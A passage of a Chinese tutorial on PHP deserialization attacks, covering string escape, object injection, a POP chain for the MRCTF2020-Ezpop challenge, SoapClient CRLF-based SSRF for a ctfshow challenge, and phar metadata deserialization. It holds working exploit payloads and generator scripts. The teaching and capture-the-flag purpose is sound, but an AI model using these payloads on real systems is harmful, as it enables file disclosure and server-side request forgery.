<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 做处理后 \75是u的16进制</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:4:"test":1:{S:8:"\\75sername";s:5:"admin";}'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h4><a id="PHP_275"></a>PHP反序列化字符逃逸</h4> 
<h5><a id="1_277"></a>情况1：过滤后字符变多</h5> 
<p>首先给出本地的php代码，很简单不做过多的解释，就是把反序列化后的一个x替换成为两个</p> 
<pre><code>&lt;?php
function change($str){
    return str_replace("x","xx",$str);
}
$name = $_GET['name'];
$age = "I am 11";
$arr = array($name,$age);
echo "反序列化字符串：";
var_dump(serialize($arr));
echo "&lt;br/&gt;";
echo "过滤后:";
$old = change(serialize($arr));
$new = unserialize($old);
var_dump($new);
echo "&lt;br/&gt;此时，age=$new[1]";
</code></pre> 
<p>正常情况,传入<code>name=mao</code></p> 
<p><img src="https://images2.imgbox.com/e9/2e/Jssldhjr_o.png" alt="在这里插入图片描述"></p> 
<p>如果此时多传入一个x的话会怎样，毫无疑问反序列化失败，由于溢出(s本来是4结果多了一个字符出来)，我们可以利用这一点实现字符串逃逸</p> 
<p><img src="https://images2.imgbox.com/b9/b0/pN98nb7P_o.png" alt="在这里插入图片描述"></p> 
<p>首先来看看结果，再来讲解</p> 
<p><img src="https://images2.imgbox.com/0f/c2/px9SI6cd_o.png" alt="在这里插入图片描述"></p> 
<p>我们传入<code>name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}</code><br> <code>";i:1;s:6:"woaini";}</code>这一部分一共二十个字符<br> 由于一个x会被替换为两个，我们输入了一共20个x，现在是40个，多出来的20个x其实取代了我们的这二十个字符<code>";i:1;s:6:"woaini";}</code>，从而造成<code>";i:1;s:6:"woaini";}</code>的溢出，而<code>"</code>闭合了前串，使得我们的字符串成功逃逸，可以被反序列化，输出<code>woaini</code><br> 最后的<code>;}</code>闭合反序列化全过程导致原来的<code>";i:1;s:7:"I am 11";}"</code>被舍弃，不影响反序列化过程`</p> 
<h5><a id="2_319"></a>情况2：过滤后字符变少</h5> 
<p>老规矩先上代码,很简单不做过多的解释，就是把反序列化后的两个x替换成为一个</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">change</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"x"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"反序列化字符串："</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"过滤后:"</span><span class="token punctuation">;</span>
<span class="token variable">$old</span> <span class="token operator">=</span> <span class="token function">change</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;"</span><span class="token punctuation">;</span>
<span class="token variable">$new</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$old</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$new</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br/&gt;此时，age="</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$new</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> 
<p>正常情况传入<code>name=mao&amp;age=11</code>的结果</p> 
<p><img src="https://images2.imgbox.com/8e/18/isABELyt_o.png" alt="在这里插入图片描述"></p> 
<p>老规矩看看最后构造的结果，再继续讲解</p> 
<p><img src="https://images2.imgbox.com/e7/23/yRzupi5E_o.png" alt="在这里插入图片描述"></p> 
<p>简单来说，就是前面少了一半，导致后面的字符被吃掉，从而执行了我们后面的代码；<br> 我们来看，这部分是age序列化后的结果</p> 
<p><code>s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"</code></p> 
<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>";s:3:"age";s:28:"11</code>这一部分刚好20个，后面由于有<code>"</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p> 
<h3><a id="_360"></a>对象注入</h3> 
<p>当用户的请求在传给反序列化函数<code>unserialize()</code>之前没有被正确的过滤时就会产生漏洞。因为PHP允许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的<code>unserialize</code>函数，最终导致一个在该应用范围内的任意PHP对象注入。</p> 
<p><strong>对象漏洞</strong>出现得满足两个前提</p> 
<blockquote> 
 <p>1、<code>unserialize</code>的参数可控。<br> 2、 代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函数。</p> 
</blockquote> 
<p>比如这个例子</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">var</span> <span class="token variable">$test</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"y4mao"</span><span class="token punctuation">;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'O:1:"A":1:{s:4:"test";s:5:"maomi";}'</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>在脚本运行结束后便会调用<code>_destruct</code>函数，同时会覆盖test变量输出<code>maomi</code></p> 
<h3><a id="POP_387"></a>POP链的构造利用</h3> 
<h4><a id="POP_389"></a>POP链简单介绍</h4> 
<p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p> 
<h4><a id="_393"></a>简单案例讲解</h4> 
<p>首先看看简单的MRCTF2020-Ezpop,不带大家一一读代码了，自己解决</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>这里我直接说利用思路，首先逆向分析，我们最终是希望通过<code>Modifier</code>当中的<code>append</code>方法实现本地文件包含读取文件，回溯到调用它的<code>__invoke</code>，当我们<code>将对象调用为函数时触发</code>,发现在<code>Test</code>类当中的<code>__get</code>方法，再回溯到<code>Show</code>当中的<code>__toString</code>，再回溯到<code>Show</code>当中的<code>__wakeup</code>当中有preg_match可以触发<code>__toString</code></p> 
<p>因此不难构造pop链</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'memory_limit'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'-1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">protected</span>  <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">str</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h3><a id="PHP_473"></a>PHP原生类反序列化利用</h3> 
<h4><a id="SoapClient_475"></a>SoapClient介绍</h4> 
<blockquote> 
 <p>综述：</p> 
 <p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p> 
 <p>必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。</p> 
 <p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容</p> 
</blockquote> 
<p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(<em>SOAP</em> 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用<code>__call</code>方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述</p> 
<h4><a id="_487"></a>利用方式</h4> 
<p>下面首先在我的VPS上面开启监听<code>nc -lvvp 9328</code></p> 
<pre><code>&lt;?php
$a = new SoapClient(null,array('uri'=&gt;'bbb', 'location'=&gt;'http://xxxx.xxx.xx:9328'));
$b = serialize($a);
$c = unserialize($b);
$c -&gt; not_a_function();//调用不存在的方法，让SoapClient调用__call
</code></pre> 
<p>运行上面的php程序，在我的vps上面奖会捕获监听</p> 
<p><img src="https://images2.imgbox.com/ee/77/jVNIGmgi_o.png" alt="在这里插入图片描述"></p> 
<p>从上面这张图可以看到，<code>SOAPAction</code>处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的<strong>CRLF</strong>即插入**\r\n**，利用成功！</p> 
<p><img src="https://images2.imgbox.com/7a/dc/EYkZIni7_o.png" alt="在这里插入图片描述"></p> 
<p>但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头<strong>Content-Type: application/x-www-form-urlencoded</strong>但<strong>Content-Type</strong>在<strong>SOAPAction</strong>的上面，就无法控制<strong>Content-Type</strong>,也就不能控制POST的数据</p> 
<p>接下来我们实验一下</p> 
<p><img src="https://images2.imgbox.com/43/0d/MBWqlnth_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="_516"></a>实战</h4> 
<p>反序列化我们传入的<strong>vip</strong>执行getFlag函数(迷惑人的函数)</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$vip</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vip'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$vip</span><span class="token operator">-&gt;</span><span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//flag.php</span>
<span class="token variable">$xff</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">','</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
​
​
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token operator">!==</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token operator">==</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问<code>127.0.0.1/flag.php</code>,即可绕过cloudfare代理</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'http://127.0.0.1/flag.php'</span><span class="token punctuation">;</span>
<span class="token variable">$post_string</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'token=ctfshow'</span><span class="token punctuation">;</span>
<span class="token variable">$headers</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'X-Forwarded-For: 127.0.0.1,127.0.0.1'</span><span class="token punctuation">,</span>
    <span class="token string single-quoted-string">'UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d'</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SoapClient</span><span class="token punctuation">(</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'location'</span> <span class="token operator">=&gt;</span> <span class="token variable">$target</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'user_agent'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'y4tacker^^Content-Type: application/x-www-form-urlencoded^^'</span><span class="token operator">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token variable">$headers</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^Content-Length: '</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post_string</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'^^^^'</span><span class="token operator">.</span><span class="token variable">$post_string</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'uri'</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"aaab"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'^^'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\r\n"</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&amp;'</span><span class="token punctuation">,</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>接下来访问<code>flag.txt</code>即可</p> 
<h3><a id="Phar_560"></a>Phar反序列化</h3> 
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p> 
<h4><a id="phar_564"></a>什么是phar文件</h4> 
<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p> 
<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。</p> 
<p>php中一些常见的流包装器如下：</p> 
<pre><code class="prism language-php">file<span class="token punctuation">:</span><span class="token comment">// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span>
http<span class="token punctuation">:</span><span class="token comment">// — 访问 HTTP(s) 网址</span>
ftp<span class="token punctuation">:</span><span class="token comment">// — 访问 FTP(s) URLs</span>
php<span class="token punctuation">:</span><span class="token comment">// — 访问各个输入/输出流（I/O streams）</span>
zlib<span class="token punctuation">:</span><span class="token comment">// — 压缩流</span>
data<span class="token punctuation">:</span><span class="token comment">// — 数据（RFC 2397）</span>
glob<span class="token punctuation">:</span><span class="token comment">// — 查找匹配的文件路径模式</span>
phar<span class="token punctuation">:</span><span class="token comment">// — PHP 归档</span>
ssh2<span class="token punctuation">:</span><span class="token comment">// — Secure Shell 2</span>
rar<span class="token punctuation">:</span><span class="token comment">// — RAR</span>
ogg<span class="token punctuation">:</span><span class="token comment">// — 音频流</span>
expect<span class="token punctuation">:</span><span class="token comment">// — 处理交互式的流</span>
</code></pre> 
<h4><a id="phar_587"></a>phar文件的结构</h4> 
<pre><code class="prism language-php">stub<span class="token punctuation">:</span>phar文件的标志，必须以 xxx <span class="token keyword">__HALT_COMPILER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">?</span><span class="token operator">&gt;</span> 结尾，否则无法识别。xxx可以为自定义内容。
manifest<span class="token punctuation">:</span>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta<span class="token operator">-</span>data，这是漏洞利用最核心的地方。
content<span class="token punctuation">:</span>被压缩文件的内容
<span class="token function">signature</span> <span class="token punctuation">(</span>可空<span class="token punctuation">)</span><span class="token punctuation">:</span>签名，放在末尾。
</code></pre> 
<p>如何生成一个phar文件？下面给出一个参考例子</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">{<!-- --></span>
    <span class="token punctuation">}</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//后缀名必须为phar</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//设置stub</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//将自定义的meta-data存入manifest</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//添加要压缩的文件</span>
    <span class="token comment">//签名自动计算</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<h4><a id="_615"></a>漏洞利用条件</h4> 
<ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol> 
<h4><a id="_621"></a>受影响的函数</h4> 
<p>知道创宇测试后受影响的函数列表：</p> 
<p><img src="https://images2.imgbox.com/c0/59/tC9grWtK_o.png" alt="在这里插入图片描述"></p> 
<p>实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38</p> 
<p>当然为了阅读方便，这里便把它整理过来</p> 
<pre><code class="prism language-php"><span class="token comment">//exif</span>
exif_thumbnail
exif_imagetype
    
<span class="token comment">//gd</span>
imageloadfont
imagecreatefrom<span class="token operator">**</span><span class="token operator">*</span>系列函数
    
<span class="token comment">//hash</span>
    
hash_hmac_file
